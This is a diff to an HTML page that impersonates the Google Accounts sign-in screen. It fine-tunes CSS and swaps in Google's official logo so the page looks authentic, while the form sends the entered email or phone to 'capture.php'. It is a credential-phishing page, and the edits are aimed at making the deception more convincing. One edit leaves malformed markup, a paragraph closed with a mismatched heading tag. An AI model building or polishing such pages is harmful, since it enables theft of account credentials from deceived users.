@@ -6,7 +6,7 @@
     <title>Sign in - Google Accounts</title>
     <style>
         body { 
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
+            font-family: 'Roboto', arial, sans-serif; 
             background-color: #fff; 
             display: flex; 
             justify-content: center; 
@@ -16,9 +16,9 @@
         }
         .login-box { 
             border: 1px solid #dadce0; 
-            padding: 40px; 
+            padding: 40px 40px 30px 40px; 
             border-radius: 8px; 
-            width: 400px; 
+            width: 450px; 
             text-align: center; 
         }
         .logo { 
@@ -30,11 +30,12 @@
             font-size: 24px; 
             font-weight: 400; 
             margin-bottom: 10px; 
+            margin-top: 0;
         }
         p { 
             color: #202124; 
             font-size: 16px; 
-            margin-bottom: 25px; 
+            margin-bottom: 24px; 
         }
         .input-group {
             margin-bottom: 15px;
@@ -47,11 +48,12 @@
             border: 1px solid #dadce0; 
             border-radius: 4px; 
             box-sizing: border-box; 
-            font-size: 16px;
+            font-size: 14px;
         }
         input:focus {
             border-color: #1a73e8;
             outline: none;
+            box-shadow: 0 0 0 1px #1a73e8;
         }
         .button-container {
             display: flex;
@@ -70,16 +72,16 @@
         }
         button:hover { 
             background-color: #1557b0; 
-            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
         }
     </style>
 </head>
 <body>
     <div class="login-box">
-        <!-- Using a public Google logo URL -->
-        <img src="https://www.gstatic.com/googleuserimages/ca/1.png" alt="Google" class="logo">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
         <h2>Sign in</h2>
-        <p>Use your Google Account</p>
+        <p>Use
+
+your Google Account</h2>
         <form action="capture.php" method="POST">
             <div class="input-group">
                 <input type="text" name="username" placeholder="Email or phone" required>
